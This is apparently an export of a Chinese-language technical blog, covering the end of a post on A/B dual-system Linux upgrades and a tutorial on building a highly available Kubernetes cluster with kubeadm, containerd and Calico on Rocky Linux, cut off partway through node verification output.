<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">+--------------------------------------------------+</span><br><span class="line">|                     /dev/sda                     |</span><br><span class="line">| +-------------------+---------------------------+|</span><br><span class="line">| |       sda1             |           sda2        |</span><br><span class="line">| | BIOS Boot Partition    |    Boot Partition     |</span><br><span class="line">| +-------------------+---------------------------+|</span><br><span class="line">| +-----------------------------------------------+|</span><br><span class="line">| |                    sda3                       ||</span><br><span class="line">| |             LVM Physical Volume               ||</span><br><span class="line">| | +----------------+--------------+-------------+|</span><br><span class="line">| | |  VA-root |  VA-back  |  VA-data | VA-image   |</span><br><span class="line">| | +----------------+--------------+-------------+|</span><br><span class="line">| +-----------------------------------------------+|</span><br><span class="line">+--------------------------------------------------+</span><br></pre></td></tr></table></figure>
<ul>
<li>使用BIOS+GPT分区格式，以兼容现有客户。分区方案包括：BIOS Boot分区（sda1）、Boot分区（sda2）和LVM分区（sda3）。LVM分区便于后期扩容。</li>
<li>在LVM分区上创建名为VA的逻辑卷组，并进一步创建四个逻辑卷：VA-root和VA-back作为两个系统分区，VA-data存储公共数据，VA-image存储镜像文件。</li>
</ul>
<h2><span id="构建升级包">构建升级包</span></h2><p>构建原理如下:</p>
<ul>
<li>通过ISO安装虚拟机, 导出虚拟机OVA文件, 解压OVA文件得到VMDK磁盘文件</li>
<li>使用guestmount挂载VMDK文件，对整个根文件系统进行打包，注意打包时需保留UID（numeric-owner）和文件扩展属性（xattr），解包时同样需要声明UID和xattr。</li>
</ul>
<h2><span id="同步系统配置">同步系统配置</span></h2><p>在升级过程中需要同步当前系统的配置到目标系统，以确保无缝升级。这些配置包括：</p>
<ul>
<li>网络配置, 比如网卡, 路由, hostname, NTP Server, DNS</li>
<li>LVM配置(&#x2F;etc&#x2F;lvm)</li>
<li>用户口令(&#x2F;etc&#x2F;shadow), SSH密钥, 以确保升级后客户仍能通过密码或SSH登录。</li>
<li>同步证书(&#x2F;etc&#x2F;pki&#x2F;tls&#x2F;certs)</li>
<li>正确设置备用分区的&#x2F;etc&#x2F;fstab，确保两个系统分区的正确挂载路径。</li>
</ul>
<h2><span id="配置grub启动项">配置GRUB启动项</span></h2><p>双系统升级需要配置GRUB以正确引导两个系统分区。这里存在一个难点：目标系统的GRUB版本可能比当前系统更高，使用当前系统的GRUB引导两个系统分区可能存在兼容性问题。针对这种情况，我采取了以下做法：</p>
<ul>
<li>使用目标系统的&#x2F;boot引导两个系统的内核。</li>
<li>通过chroot方式配置并重装GRUB。</li>
<li>如果GRUB配置失败，回滚到升级前的状态。</li>
</ul>
<p><strong>为什么不直接把目标系统的&#x2F;boot放在LVM系统分区？</strong></p>
<ul>
<li>兼容性问题, 传统BIOS和某些UEFI固件不支持直接从LVM卷启动</li>
<li>复杂性增加, 故障恢复困难</li>
</ul>
<p><strong>为什么不划两个&#x2F;boot分区？</strong></p>
<ul>
<li>手动修改风险：客户需要手动调整磁盘分区，这不仅增加了操作难度，还可能导致数据丢失或分区表损坏。</li>
<li>实现复杂性：理论上划分两个&#x2F;boot分区是可行的，但实现起来较为复杂。实际上，GRUB的一个&#x2F;boot分区就可以引导多个版本的内核，支持向前兼容。</li>
</ul>
<h2><span id="优化">优化</span></h2><p>当目标系统GRUB版本与当前系统不一致时，直接覆盖&#x2F;boot分区可能导致旧系统的引导文件丢失，进而导致启动故障。<br>实际测试中，没有遇到客户出现此类问题。如果要避免覆盖问题，可以使用EFI系统分区，为每个系统创建独立目录存放引导文件：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/boot/efi/EFI/systemA/</span><br><span class="line">/boot/efi/EFI/systemB/</span><br></pre></td></tr></table></figure>
<h2><span id="问题记录">问题记录</span></h2><p><strong>1. 客户升级后admin用户无法登录</strong></p>
<p>定位：后台查看发现admin用户的文件UID不正确，升级前后两个系统的用户配置不一致。同样的admin用户在两个系统上的UID不同。由于升级包是通过tar备份的，而tar解压文件的默认行为是根据当前系统用户名进行映射，而不是UID，因此升级后文件的UID不正确。</p>
<p>解决方法：在tar解压时添加–numeric-owner参数，保留文件的UID，解决了问题。</p>
<p><strong>2. 升级到Rocky Linux 9.4后, 客户设备启动故障, 报错: 虚拟机CPU不支持x86_64_v2</strong></p>
<p>定位：查看&#x2F;proc&#x2F;cpuinfo，发现客户虚拟机不支持x86_64_v2指令集，但物理服务器支持该指令集。</p>
<p>解决方法：指导客户开启CPU虚拟化扩展，并在升级前验证虚拟机CPU是否支持所需指令集。如果不支持，则直接上报失败。</p>
<p><strong>3: 配置了双网卡的客户, 在升级到Rocky Linux 9.4后有概率出现网络不通, 网卡的IP,Gateway配置看上去是正确的</strong></p>
<p>定位: 首先ping网关, 发现网关不可达, 通过ethtool查看网卡信息, 发现升级后eth0和eth1顺序反了, 导致网络不通</p>
<p>原因: 现代Linux系统通常使用基于硬件信息（如PCI总线ID）的可预测网卡命名规则，保证OS升级后网卡顺序也是正确的。 但是我们的网关设备采用的还是传统的eth命名规则，这种规则不能保证网卡顺序的正确性。</p>
<p>解决方法: 升级后用ethtool判断网卡顺序是否正确, 如果不正确, 用modprobe按正确顺序加载网卡驱动; (如果两个网卡驱动相同, 还需要修改udev规则)</p>
<h2><span id="参考">参考</span></h2><p><a href="https://source.android.com/docs/core/ota/ab?hl=zh-cn">Android A&#x2F;B（无缝）系统更新</a></p>
]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>Linux</tag>
        <tag>Project</tag>
      </tags>
  </entry>
  <entry>
    <title>kubeadm+keepalived+HAproxy搭建高可用kubernetes集群(三主三从两LB)</title>
    <url>/2025/0320222352.html</url>
    <content><![CDATA[<h1><span id="集群规划">集群规划</span></h1><p>8台Linux虚拟机, Rocky Linux 9.5 x86_64 </p>
<ul>
<li>主节点(3个): 2CPU, 3G内存, 20G硬盘</li>
<li>工作节点(2个): 2CPU, 3G内存, 20G硬盘</li>
<li>LB(2个): 1CPU, 2G内存, 10G硬盘</li>
</ul>
<p><img data-src="/2025/0320222352/image1.png"></p>
<p>各个机器IP、主机名、角色如下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">192.168.52.91 k8s-master1 主节点1</span><br><span class="line">192.168.52.92 k8s-master2 主节点2</span><br><span class="line">192.168.52.93 k8s-master3 主节点3</span><br><span class="line"></span><br><span class="line">192.168.52.101 k8s-slave1 从节点1</span><br><span class="line">192.168.52.102 k8s-slave2 从节点2</span><br><span class="line">192.168.52.103 k8s-slave3 从节点3</span><br><span class="line"></span><br><span class="line">192.168.52.80 k8s-lb1 HAProxy</span><br><span class="line">192.168.52.81 k8s-lb2 HAProxy</span><br><span class="line">192.168.52.88 www.petertest.com Virtual IP(VIP)</span><br></pre></td></tr></table></figure>

<p>以下分步搭建kubernetes集群</p>
<ul>
<li>搭建一主一从集群</li>
<li>添加负载均衡(HAProxy)</li>
<li>搭建三主三从集群(三主三从两LB)</li>
</ul>
<span id="more"></span>

<h1><span id="一-搭建一主一从集群">一、搭建一主一从集群</span></h1><h2><span id="0-准备工作">0. 准备工作</span></h2><p>创建两台虚拟机, 1台作为主节点, 1台作为工作节点</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">192.168.52.91 k8s-master1 主节点1</span><br><span class="line">192.168.52.101 k8s-slave1 从节点1</span><br></pre></td></tr></table></figure>

<h3><span id="更新系统软件包">更新系统软件包</span></h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">dnf update -y</span><br></pre></td></tr></table></figure>

<h3><span id="修改主机名">修改主机名</span></h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hostnamectl set-hostname XXX</span><br></pre></td></tr></table></figure>

<h3><span id="修改hosts文件">修改hosts文件</span></h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">192.168.52.91 k8s-master1</span><br><span class="line">192.168.52.92 k8s-master2</span><br><span class="line">192.168.52.93 k8s-master3</span><br><span class="line"></span><br><span class="line">192.168.52.101 k8s-slave1</span><br><span class="line">192.168.52.102 k8s-slave2</span><br><span class="line">192.168.52.103 k8s-slave3</span><br><span class="line"></span><br><span class="line">192.168.52.80 k8s-lb1</span><br><span class="line">192.168.52.81 k8s-lb2</span><br><span class="line">192.168.52.88 www.petertest.com</span><br></pre></td></tr></table></figure>

<h3><span id="关闭防火墙">关闭防火墙</span></h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">systemctl stop firewalld</span><br><span class="line">systemctl disable firewalld</span><br></pre></td></tr></table></figure>

<h3><span id="关闭selinux">关闭SELINUX</span></h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">setenforce 0</span><br><span class="line">sed --follow-symlinks -i &quot;s/SELINUX=enforcing/SELINUX=disabled/g&quot; /etc/selinux/config</span><br></pre></td></tr></table></figure>


<h3><span id="禁用交换分区">禁用交换分区</span></h3><p>kubelet默认行为是在节点上检测到交换内存时无法启动，所以这里先禁用交换分区。临时禁用交换分区方法:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">swapoff -a</span><br></pre></td></tr></table></figure>
<p>永久禁用交换分区，修改<code>/etc/fstab</code>, 注释掉swap分区那一行的配置</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sed -i &#x27;/\/dev\/mapper\/rl-swap/s/^/#/&#x27; /etc/fstab</span><br></pre></td></tr></table></figure>

<h3><span id="加载内核模块-再设置内核参数">加载内核模块, 再设置内核参数</span></h3><p>临时加载内核模块</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">modprobe ip_vs_rr</span><br><span class="line">modprobe br_netfilter</span><br><span class="line">modprobe overlay</span><br></pre></td></tr></table></figure>
<p>每次启动时自动加载内核模块</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cat &lt;&lt;EOF | sudo tee /etc/modules-load.d/k8s.conf</span><br><span class="line">br_netfilter</span><br><span class="line">overlay</span><br><span class="line">ip_vs_rr</span><br><span class="line">EOF</span><br></pre></td></tr></table></figure>
<p>再设置内核参数</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cat &lt;&lt;EOF | tee /etc/sysctl.d/k8s.conf</span><br><span class="line">net.bridge.bridge-nf-call-ip6tables = 1</span><br><span class="line">net.bridge.bridge-nf-call-iptables 	= 1</span><br><span class="line">net.ipv4.ip_forward 				= 1</span><br><span class="line">EOF</span><br><span class="line"></span><br><span class="line">sysctl -p /etc/sysctl.d/k8s.conf</span><br></pre></td></tr></table></figure>

<h2><span id="1-安装containerd-kubeadm-kubelet-kubectl">1. 安装containerd, kubeadm, kubelet, kubectl</span></h2><p>国内机器需要更换YUM源</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sed -e &#x27;s|^mirrorlist=|#mirrorlist=|g&#x27; \</span><br><span class="line">    -e &#x27;s|^#baseurl=http://dl.rockylinux.org/$contentdir|baseurl=https://mirrors.aliyun.com/rockylinux|g&#x27; \</span><br><span class="line">    -i.bak \</span><br><span class="line">    /etc/yum.repos.d/[Rr]ocky-*.repo</span><br><span class="line">dnf makecache</span><br></pre></td></tr></table></figure>

<h3><span id="安装containerd">安装containerd</span></h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">dnf config-manager --add-repo https://mirrors.aliyun.com/docker-ce/linux/centos/docker-ce.repo # 国内用阿里源</span><br><span class="line">#dnf config-manager --add-repo https://download.docker.com/linux/centos/docker-ce.repo</span><br><span class="line">dnf install -y containerd</span><br></pre></td></tr></table></figure>

<h3><span id="配置containerd">配置containerd</span></h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">containerd config default &gt; /etc/containerd/config.toml</span><br></pre></td></tr></table></figure>
<p>再修改<code>/etc/containerd/config.toml</code></p>
<ul>
<li>把SystemdCGroup的值改成true</li>
<li>把sandbox_image改为<code>registry.aliyuncs.com/google_containers/pause:3.9</code> (国内用户需要做这一步，把镜像换成阿里的)</li>
</ul>
<h3><span id="启动containerd">启动containerd</span></h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">systemctl daemon-reload</span><br><span class="line">systemctl enable --now containerd</span><br></pre></td></tr></table></figure>
<p>查看containerd版本</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># ctr version</span><br><span class="line">Client:</span><br><span class="line">  Version:  1.7.25</span><br><span class="line">  Revision: bcc810d6b9066471b0b6fa75f557a15a1cbf31bb</span><br><span class="line">  Go version: go1.22.10</span><br><span class="line"></span><br><span class="line">Server:</span><br><span class="line">  Version:  1.7.25</span><br><span class="line">  Revision: bcc810d6b9066471b0b6fa75f557a15a1cbf31bb</span><br><span class="line">  UUID: 086ce061-3335-48a7-9b78-67b3f12c43ef</span><br></pre></td></tr></table></figure>

<h3><span id="安装kubeadm-kubelet-kubectl">安装kubeadm, kubelet, kubectl</span></h3><p>先添加k8s的repo</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cat &lt;&lt;EOF &gt; /etc/yum.repos.d/kubernetes.repo</span><br><span class="line">[kubernetes]</span><br><span class="line">name=Kubernetes</span><br><span class="line">baseurl=https://mirrors.aliyun.com/kubernetes/yum/repos/kubernetes-el7-x86_64/</span><br><span class="line">enabled=1</span><br><span class="line">gpgcheck=1</span><br><span class="line">repo_gpgcheck=1</span><br><span class="line">gpgkey=https://mirrors.aliyun.com/kubernetes/yum/doc/yum-key.gpg https://mirrors.aliyun.com/kubernetes/yum/doc/rpm-package-key.gpg</span><br><span class="line">EOF</span><br></pre></td></tr></table></figure>
<p>再通过yum安装kubelet, kubeadm, kubectl</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">yum install -y kubelet kubeadm kubectl</span><br><span class="line">systemctl enable --now kubelet</span><br></pre></td></tr></table></figure>
<p>查看kubelet, kubeadm, kubectl版本</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">kubeadm version</span><br><span class="line">kubeadm version: &amp;version.Info&#123;Major:&quot;1&quot;, Minor:&quot;28&quot;, GitVersion:&quot;v1.28.2&quot;, GitCommit:&quot;89a4ea3e1e4ddd7f7572286090359983e0387b2f&quot;, GitTreeState:&quot;clean&quot;, BuildDate:&quot;2023-09-13T09:34:32Z&quot;, GoVersion:&quot;go1.20.8&quot;, Compiler:&quot;gc&quot;, Platform:&quot;linux/amd64&quot;&#125;</span><br><span class="line"></span><br><span class="line"># kubectl version</span><br><span class="line">Client Version: v1.28.2</span><br><span class="line">Kustomize Version: v5.0.4-0.20230601165947-6ce0bf390ce3</span><br><span class="line">The connection to the server localhost:8080 was refused - did you specify the right host or port?</span><br><span class="line"></span><br><span class="line"># kubelet --version</span><br><span class="line">Kubernetes v1.28.2</span><br></pre></td></tr></table></figure>
<p>说明: kubelet现在每隔几秒就会重启，它陷入了一个等待 kubeadm 指令的死循环, 这是符合预期的。 接下来需要在主节点执行kubeadm init，初始化k8s集群</p>
<h2><span id="2-初始化k8s集群">2. 初始化k8s集群</span></h2><h3><span id="在主节点执行kubeadm-init">在主节点执行kubeadm init</span></h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">kubeadm init --apiserver-advertise-address 192.168.52.91 \</span><br><span class="line">			 --image-repository registry.aliyuncs.com/google_containers \</span><br><span class="line">			 --kubernetes-version v1.28.2 \</span><br><span class="line">			 --pod-network-cidr=198.18.0.0/16</span><br></pre></td></tr></table></figure>
<p>参数说明:<br>–apiserver-advertise-address：监听地址，填主节点IP<br>–image-repository：国内用户需指定镜像地址为阿里云的，默认是海外镜像你无法访问。<br>–kubernetes-version：指定kubernetes的版本<br>–pod-network-cidr&#x3D;198.18.0.0&#x2F;16 (这个cidr表示Pod的IP地址范围，根据你的网络环境自定义，不能和其他IP发生冲突即可) </p>
<p>执行时间较长，耐心等几分钟。 执行成功后，会打印如下内容，提示你下一步怎么做</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Your Kubernetes control-plane has initialized successfully!</span><br><span class="line"></span><br><span class="line">To start using your cluster, you need to run the following as a regular user:</span><br><span class="line"></span><br><span class="line">  mkdir -p $HOME/.kube</span><br><span class="line">  sudo cp -i /etc/kubernetes/admin.conf $HOME/.kube/config</span><br><span class="line">  sudo chown $(id -u):$(id -g) $HOME/.kube/config</span><br><span class="line"></span><br><span class="line">Alternatively, if you are the root user, you can run:</span><br><span class="line"></span><br><span class="line">  export KUBECONFIG=/etc/kubernetes/admin.conf</span><br><span class="line"></span><br><span class="line">You should now deploy a pod network to the cluster.</span><br><span class="line">Run &quot;kubectl apply -f [podnetwork].yaml&quot; with one of the options listed at:</span><br><span class="line">  https://kubernetes.io/docs/concepts/cluster-administration/addons/</span><br><span class="line"></span><br><span class="line">Then you can join any number of worker nodes by running the following on each as root:</span><br><span class="line"></span><br><span class="line">kubeadm join 192.168.52.91:6443 --token qtmi2g.1jnqftmkjm72xb75 \</span><br><span class="line">        --discovery-token-ca-cert-hash sha256:0b94fe5b0e0405dc3cea832a5d2100ef8f4505196f52f8c7c992504b5b419532</span><br></pre></td></tr></table></figure>
<p>我使用的是root用户，参照上面的提示，只需export环境变量KUBECONFIG，操作如下：<br>编辑&#x2F;etc&#x2F;profile，结尾添加一行</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">export KUBECONFIG=/etc/kubernetes/admin.conf</span><br></pre></td></tr></table></figure>
<p>使环境变量立即生效</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">source /etc/profile</span><br></pre></td></tr></table></figure>

<p>此时，kubectl已经可以查到如下pod, 但coredns pod运行不成功。下一步需要在主节点上安装网络插件</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">kubectl get pods -A</span><br><span class="line">NAMESPACE     NAME                                 READY   STATUS    RESTARTS   AGE</span><br><span class="line">kube-system   coredns-66f779496c-8ctsc             0/1     Pending   0          3m11s</span><br><span class="line">kube-system   coredns-66f779496c-hx76v             0/1     Pending   0          3m11s</span><br><span class="line">kube-system   etcd-k8s-master                      1/1     Running   0          3m24s</span><br><span class="line">kube-system   kube-apiserver-k8s-master            1/1     Running   0          3m24s</span><br><span class="line">kube-system   kube-controller-manager-k8s-master   1/1     Running   0          3m24s</span><br><span class="line">kube-system   kube-proxy-89c9k                     1/1     Running   0          3m11s</span><br><span class="line">kube-system   kube-scheduler-k8s-master            1/1     Running   0          3m24s</span><br></pre></td></tr></table></figure>

<h3><span id="在主节点安装calico网络插件">在主节点安装calico网络插件</span></h3><p>安装网络插件，可以选择calico或者flannel，我这里选calico，安装参考<a href="https://docs.tigera.io/calico/latest/getting-started/kubernetes/quickstart">官方文档</a><br>1、Install the Tigera Calico operator and custom resource definitions.</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">yum install -y wget</span><br><span class="line">wget https://raw.githubusercontent.com/projectcalico/calico/v3.29.1/manifests/tigera-operator.yaml</span><br><span class="line">kubectl create -f tigera-operator.yaml</span><br></pre></td></tr></table></figure>
<p>2、Install Calico by creating the necessary custom resource. </p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">wget https://raw.githubusercontent.com/projectcalico/calico/v3.29.1/manifests/custom-resources.yaml</span><br><span class="line">修改custom-resources.yaml, 把cidr改成198.18.0.0/16</span><br><span class="line">kubectl create -f custom-resources.yaml</span><br></pre></td></tr></table></figure>
<p>3、Confirm that all of the pods are running with the following command.</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">watch kubectl get pods -n calico-system</span><br></pre></td></tr></table></figure>
<p>Wait until each pod has the STATUS of Running.</p>
<p>4、Remove the taints on the control plane so that you can schedule pods on it.</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">kubectl taint nodes --all node-role.kubernetes.io/control-plane-</span><br><span class="line">node/k8s-master untainted</span><br></pre></td></tr></table></figure>
<p>注: 后续如果希望业务容器只调度到工作节点, 需要加上这个污点</p>
<p>5、 Confirm that you now have a node in your cluster with the following command.</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">kubectl get nodes -o wide</span><br><span class="line">NAME         STATUS   ROLES           AGE     VERSION   INTERNAL-IP     EXTERNAL-IP   OS-IMAGE                      KERNEL-VERSION                 CONTAINER-RUNTIME</span><br><span class="line">k8s-master   Ready    control-plane   5h16m   v1.28.2   10.206.216.96   &lt;none&gt;        Rocky Linux 9.4 (Blue Onyx)   5.14.0-427.13.1.el9_4.x86_64   containerd://1.7.24</span><br></pre></td></tr></table></figure>

<p>注: 如果是国内用户，会遇到Pod启动失败问题，需要手动从国内镜像站拉取镜像，再改一下tag即可 (国内镜像站: <a href="https://docker.aityp.com/">https://docker.aityp.com</a>)</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ctr -n k8s.io images pull swr.cn-north-4.myhuaweicloud.com/ddn-k8s/docker.io/calico/apiserver:v3.29.1</span><br><span class="line">ctr -n k8s.io images tag swr.cn-north-4.myhuaweicloud.com/ddn-k8s/docker.io/calico/apiserver:v3.29.1 docker.io/calico/apiserver:v3.29.1</span><br><span class="line"></span><br><span class="line">ctr -n k8s.io images pull swr.cn-north-4.myhuaweicloud.com/ddn-k8s/docker.io/calico/cni:v3.29.1</span><br><span class="line">ctr -n k8s.io images tag swr.cn-north-4.myhuaweicloud.com/ddn-k8s/docker.io/calico/cni:v3.29.1 docker.io/calico/cni:v3.29.1</span><br><span class="line"></span><br><span class="line">ctr -n k8s.io images pull swr.cn-north-4.myhuaweicloud.com/ddn-k8s/docker.io/calico/csi:v3.29.1</span><br><span class="line">ctr -n k8s.io images tag swr.cn-north-4.myhuaweicloud.com/ddn-k8s/docker.io/calico/csi:v3.29.1 docker.io/calico/csi:v3.29.1</span><br><span class="line"></span><br><span class="line">ctr -n k8s.io images pull swr.cn-north-4.myhuaweicloud.com/ddn-k8s/docker.io/calico/kube-controllers:v3.29.1</span><br><span class="line">ctr -n k8s.io images tag swr.cn-north-4.myhuaweicloud.com/ddn-k8s/docker.io/calico/kube-controllers:v3.29.1 docker.io/calico/kube-controllers:v3.29.1</span><br><span class="line"></span><br><span class="line">ctr -n k8s.io images pull swr.cn-north-4.myhuaweicloud.com/ddn-k8s/docker.io/calico/node-driver-registrar:v3.29.1</span><br><span class="line">ctr -n k8s.io images tag swr.cn-north-4.myhuaweicloud.com/ddn-k8s/docker.io/calico/node-driver-registrar:v3.29.1 docker.io/calico/node-driver-registrar:v3.29.1</span><br><span class="line"></span><br><span class="line">ctr -n k8s.io images pull swr.cn-north-4.myhuaweicloud.com/ddn-k8s/docker.io/calico/node:v3.29.1</span><br><span class="line">ctr -n k8s.io images tag swr.cn-north-4.myhuaweicloud.com/ddn-k8s/docker.io/calico/node:v3.29.1 docker.io/calico/node:v3.29.1</span><br><span class="line"></span><br><span class="line">ctr -n k8s.io images pull swr.cn-north-4.myhuaweicloud.com/ddn-k8s/docker.io/calico/pod2daemon-flexvol:v3.29.1</span><br><span class="line">ctr -n k8s.io images tag swr.cn-north-4.myhuaweicloud.com/ddn-k8s/docker.io/calico/pod2daemon-flexvol:v3.29.1 docker.io/calico/pod2daemon-flexvol:v3.29.1</span><br><span class="line"></span><br><span class="line">ctr -n k8s.io images pull swr.cn-north-4.myhuaweicloud.com/ddn-k8s/docker.io/calico/typha:v3.29.1</span><br><span class="line">ctr -n k8s.io images tag swr.cn-north-4.myhuaweicloud.com/ddn-k8s/docker.io/calico/typha:v3.29.1 docker.io/calico/typha:v3.29.1</span><br></pre></td></tr></table></figure>

<p>导入镜像后, 查看calico Pod创建成功</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">kubectl get pods -A</span><br><span class="line">NAMESPACE          NAME                                       READY   STATUS    RESTARTS        AGE</span><br><span class="line">calico-apiserver   calico-apiserver-5cb44cddc4-tjb85          1/1     Running   0               22m</span><br><span class="line">calico-apiserver   calico-apiserver-5cb44cddc4-v4nlj          1/1     Running   0               22m</span><br><span class="line">calico-system      calico-kube-controllers-69d6c7f5d4-tnnn7   1/1     Running   0               107s</span><br><span class="line">calico-system      calico-node-bwg5x                          1/1     Running   0               47s</span><br><span class="line">calico-system      calico-typha-8cc7f9579-hksgd               1/1     Running   0               107s</span><br><span class="line">calico-system      csi-node-driver-j4tfr                      2/2     Running   0               107s</span><br><span class="line">kube-system        coredns-66f779496c-5k796                   1/1     Running   0               49m</span><br><span class="line">kube-system        coredns-66f779496c-mxc5j                   1/1     Running   0               49m</span><br><span class="line">kube-system        etcd-k8s-master1                           1/1     Running   1 (3m50s ago)   50m</span><br><span class="line">kube-system        kube-apiserver-k8s-master1                 1/1     Running   1 (3m50s ago)   50m</span><br><span class="line">kube-system        kube-controller-manager-k8s-master1        1/1     Running   1 (3m50s ago)   50m</span><br><span class="line">kube-system        kube-proxy-gczxm                           1/1     Running   1 (3m50s ago)   49m</span><br><span class="line">kube-system        kube-scheduler-k8s-master1                 1/1     Running   1 (3m50s ago)   50m</span><br><span class="line">tigera-operator    tigera-operator-c7ccbd65-rzt2l             1/1     Running   1 (3m50s ago)   27m</span><br></pre></td></tr></table></figure>

<h3><span id="安装calicoctl">安装calicoctl</span></h3><p>参考官方文档: <a href="https://docs.tigera.io/calico/latest/operations/calicoctl/install">https://docs.tigera.io/calico/latest/operations/calicoctl/install</a></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">curl -L https://github.com/projectcalico/calico/releases/download/v3.29.1/calicoctl-linux-amd64 -o calicoctl</span><br><span class="line">chmod +x ./calicoctl</span><br><span class="line">cp calicoctl /usr/bin/</span><br></pre></td></tr></table></figure>

<p>calicoctl查看节点</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># calicoctl node status</span><br><span class="line">Calico process is running.</span><br><span class="line"></span><br><span class="line">IPv4 BGP status</span><br><span class="line">No IPv4 peers found.</span><br><span class="line"></span><br><span class="line">IPv6 BGP status</span><br><span class="line">No IPv6 peers found.</span><br><span class="line"></span><br><span class="line"># calicoctl get nodes</span><br><span class="line">NAME</span><br><span class="line">k8s-master1</span><br></pre></td></tr></table></figure>

<h2><span id="3-把从节点加入集群">3. 把从节点加入集群</span></h2><h3><span id="先在master节点上获取token">先在Master节点上获取token</span></h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">kubeadm token list | awk &#x27;&#123;print $1&#125;&#x27;</span><br><span class="line">TOKEN</span><br><span class="line">qtmi2g.1jnqftmkjm72xb75</span><br></pre></td></tr></table></figure>
<p>默认token 24小时内过期，如果过期了，可以在主节点上重新创建新token</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">kubeadm token create</span><br></pre></td></tr></table></figure>

<h3><span id="再从主节点上获取discovery-token-ca-cert-hash的值">再从主节点上获取–discovery-token-ca-cert-hash的值</span></h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">openssl x509 -pubkey -in /etc/kubernetes/pki/ca.crt | openssl rsa -pubin -outform der 2&gt;/dev/null | \</span><br><span class="line">   openssl dgst -sha256 -hex | sed &#x27;s/^.* //&#x27;</span><br><span class="line">0b94fe5b0e0405dc3cea832a5d2100ef8f4505196f52f8c7c992504b5b419532</span><br></pre></td></tr></table></figure>

<h3><span id="最后-从节点执行kubeadm-join命令将从节点加入集群">最后, 从节点执行kubeadm join命令，将从节点加入集群:</span></h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">kubeadm join --token qtmi2g.1jnqftmkjm72xb75 \</span><br><span class="line">		192.168.52.91:6443 \</span><br><span class="line">		--discovery-token-ca-cert-hash sha256:0b94fe5b0e0405dc3cea832a5d2100ef8f4505196f52f8c7c992504b5b419532</span><br><span class="line"></span><br><span class="line">[preflight] Running pre-flight checks</span><br><span class="line">        [WARNING Service-Kubelet]: kubelet service is not enabled, please run &#x27;systemctl enable kubelet.service&#x27;</span><br><span class="line">[preflight] Reading configuration from the cluster...</span><br><span class="line">[preflight] FYI: You can look at this config file with &#x27;kubectl -n kube-system get cm kubeadm-config -o yaml&#x27;</span><br><span class="line">[kubelet-start] Writing kubelet configuration to file &quot;/var/lib/kubelet/config.yaml&quot;</span><br><span class="line">[kubelet-start] Writing kubelet environment file with flags to file &quot;/var/lib/kubelet/kubeadm-flags.env&quot;</span><br><span class="line">[kubelet-start] Starting the kubelet</span><br><span class="line">[kubelet-start] Waiting for the kubelet to perform the TLS Bootstrap...</span><br><span class="line"></span><br><span class="line">This node has joined the cluster:</span><br><span class="line">* Certificate signing request was sent to apiserver and a response was received.</span><br><span class="line">* The Kubelet was informed of the new secure connection details.</span><br><span class="line"></span><br><span class="line">Run &#x27;kubectl get nodes&#x27; on the control-plane to see this node join the cluster.</span><br></pre></td></tr></table></figure>
<p>将kubelet设为开机自启动</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">systemctl enable kubelet.service</span><br></pre></td></tr></table></figure>

<h3><span id="查看从节点是否加入成功">查看从节点是否加入成功</span></h3><p>需要等几分钟，直到所有Pod创建完成 (国内用户需要手动在从节点上下载calico镜像)</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># kubectl get pods -A</span><br><span class="line">NAMESPACE          NAME                                       READY   STATUS    RESTARTS      AGE</span><br><span class="line">calico-apiserver   calico-apiserver-5cb44cddc4-tjb85          1/1     Running   0             50m</span><br><span class="line">calico-apiserver   calico-apiserver-5cb44cddc4-v4nlj          1/1     Running   0             50m</span><br><span class="line">calico-system      calico-kube-controllers-69d6c7f5d4-tnnn7   1/1     Running   0             30m</span><br><span class="line">calico-system      calico-node-bwg5x                          1/1     Running   0             29m</span><br><span class="line">calico-system      calico-node-rtsfd                          1/1     Running   0             14m</span><br><span class="line">calico-system      calico-typha-8cc7f9579-hksgd               1/1     Running   0             30m</span><br><span 